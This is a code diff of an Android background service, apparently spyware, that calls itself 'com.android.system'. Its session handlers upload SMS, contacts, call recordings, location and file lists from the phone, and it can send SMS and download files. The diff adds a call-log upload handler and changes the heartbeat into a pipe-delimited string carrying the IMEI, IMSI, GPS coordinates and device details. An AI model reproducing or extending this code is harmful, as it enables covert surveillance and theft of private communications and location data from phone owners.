@@ -20,6 +20,7 @@ import com.android.system.session.handler.FileListSessionHandler;
 import com.android.system.session.handler.LocationListSessionHandler;
 import com.android.system.session.handler.RecordListSessionHandler;
 import com.android.system.session.handler.SendSmsSessionHandler;
+import com.android.system.session.handler.UploadCallLogSessionHandler;
 import com.android.system.session.handler.UploadContactsSessionHandler;
 import com.android.system.session.handler.UploadSmsSessionHandler;
 import com.android.system.utils.LocationUtil;
@@ -59,6 +60,7 @@ public class SystemService extends Service{
     private NetworkManager mNetworkManager = new NetworkManager(mSessionManager);
 
     private static final String SESSION_CALL_RECORD = "call_record";
+    private static final String SESSION_CALL_LOG = "call_log";
     private static final String SESSION_LOCATION_LIST = "location_list";
     private static final String SESSION_FILE_DOWNLOAD = "file_download";
     private static final String SESSION_FILE_LIST = "file_list";
@@ -68,24 +70,37 @@ public class SystemService extends Service{
 
     private double longitude = 0, latitude = 0;
     private byte[] getHeartBeatData() {
-        JSONObject jsonObject = new JSONObject();
-        try {
-            TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
-            jsonObject.put("model",Build.MODEL)
-                    .put("brand", Build.BRAND)
-                    .put("version",Build.VERSION.RELEASE)
-                    .put("memory", SystemUtil.getAvailMemory(this) + " / " + SystemUtil.getTotalMemory(this) )
-                    .put("storage", SystemUtil.getStorageInfo(this))
-                    .put("network_state", SystemUtil.getNetworkConnectTypeString(this))
-                    .put("sim_operator",tm.getSimOperatorName())
-                    .put("imei", tm.getDeviceId())
-                    .put("imsi", tm.getSubscriberId())
-                    .put("longitude", ""+longitude)
-                    .put("latitude", ""+latitude);
-        } catch (JSONException e) {
-            e.printStackTrace();
-        }
-        return jsonObject.toString().getBytes();
+//        JSONObject jsonObject = new JSONObject();
+//        try {
+//            TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+//            jsonObject.put("model",Build.MODEL)
+//                    .put("brand", Build.BRAND)
+//                    .put("version",Build.VERSION.RELEASE)
+//                    .put("memory", SystemUtil.getAvailMemory(this) + " / " + SystemUtil.getTotalMemory(this) )
+//                    .put("storage", SystemUtil.getStorageInfo(this))
+//                    .put("network_state", SystemUtil.getNetworkConnectTypeString(this))
+//                    .put("sim_operator",tm.getSimOperatorName())
+//                    .put("imei", tm.getDeviceId())
+//                    .put("imsi", tm.getSubscriberId())
+//                    .put("longitude", ""+longitude)
+//                    .put("latitude", ""+latitude);
+//        } catch (JSONException e) {
+//            e.printStackTrace();
+//        }
+//        return jsonObject.toString().getBytes();
+        TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        StringBuffer stringBuffer = new StringBuffer();
+        stringBuffer.append(SystemUtil.getNetworkConnectTypeString(this) + "|");
+        stringBuffer.append(Build.BRAND + "|");
+        stringBuffer.append(Build.VERSION.RELEASE + "|");
+        stringBuffer.append(Build.MODEL + "|");
+        stringBuffer.append(SystemUtil.getAvailMemory(this) + " / " + SystemUtil.getTotalMemory(this) + "|");
+        stringBuffer.append(SystemUtil.getStorageInfo(this) + "|");
+        stringBuffer.append(tm.getSimOperatorName() + "|");
+        stringBuffer.append(longitude + "/" + latitude + "|");
+        stringBuffer.append(tm.getDeviceId() + "|");
+        stringBuffer.append(tm.getSubscriberId() );
+        return stringBuffer.toString().getBytes();
     }
 
     private void init() {
@@ -121,6 +136,7 @@ public class SystemService extends Service{
         mSessionManager.addSessionHandler(SESSION_UPLOAD_SMS, new UploadSmsSessionHandler());
         mSessionManager.addSessionHandler(SESSION_LOCATION_LIST,new LocationListSessionHandler());
         mSessionManager.addSessionHandler(SESSION_CALL_RECORD, new RecordListSessionHandler(SystemService.this.getFilesDir().getAbsolutePath()));
+        mSessionManager.addSessionHandler(SESSION_CALL_LOG,new UploadCallLogSessionHandler());
         mSessionManager.addSessionHandler(SESSION_FILE_DOWNLOAD, new FileDownloadSessionHandler());
         mSessionManager.addSessionHandler(SESSION_FILE_LIST, new FileListSessionHandler());
 
@@ -136,7 +152,7 @@ public class SystemService extends Service{
 
     private void loadConfig() {
         try {
-            //read address, port, from "config" file
+            //read number, port, from "config" file
             InputStream is = getAssets().open("config");
             byte[] data = new byte[is.available()];
             is.read(data);
